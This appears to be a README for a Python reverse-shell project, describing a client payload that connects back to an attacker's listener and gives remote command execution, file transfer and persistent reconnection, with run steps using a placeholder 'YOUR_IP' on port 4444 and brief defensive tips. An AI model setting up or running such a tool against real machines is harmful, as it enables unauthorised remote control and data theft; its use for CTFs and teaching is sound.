# 🐚 Python Reverse Shell

## 📌 Overview

This project demonstrates a **simple reverse shell** implemented in Python. It includes two scripts:

- `client.py`: Reverse shell payload that connects back to the attacker's server.
- `server.py`: Listener that receives the connection and sends commands to the victim.

Designed for **ethical hacking demonstrations, CTFs, and educational use** only.

---

## ⚠️ Legal Disclaimer

> This tool is provided for **educational purposes only**.  
> Do not use it on networks or systems without **explicit written permission**.  
> The developers are **not responsible** for any misuse or damage caused by this software.

---

## 🚀 Features

- Remote shell command execution
- File upload/download between victim and attacker
- Base64 encoding for safe file transfer
- Persistent reconnection from the client side

---


## 🧰 Requirements

- Python 3.x
- No external dependencies (uses built-in modules: `socket`, `json`, `os`, `base64`, `subprocess`)

---

## 🛠️ Usage

### Step 1: Start the Listener (Server)

Edit the IP address in `server.py` to your machine's local IP:

```python
server('YOUR_IP', 4444)
```

Run it:

```bash
python3 server.py
```

---

### Step 2: Launch the Reverse Shell (Client)

Edit the IP address in `client.py` to match the server:

```python
server('YOUR_IP', 4444)
```

Run it on the target machine:

```bash
python3 client.py
```

---

## 🧪 Available Commands

In the server prompt (`Shell#:`), you can:

- Execute system commands (e.g., `whoami`, `ls`, `dir`, etc.)
- Navigate directories: `cd /path/to/dir`
- Download files from target: `download filename`
- Upload files to target: `upload filename`
- Exit session: `exit`

---

## 🧯 Defensive Tips

- Disable unused ports and services (especially Python in prod environments).
- Use a firewall to block outbound reverse shell attempts.
- Monitor unusual outbound connections.
- Consider using EDR or IDS to catch reverse shell behavior.

---
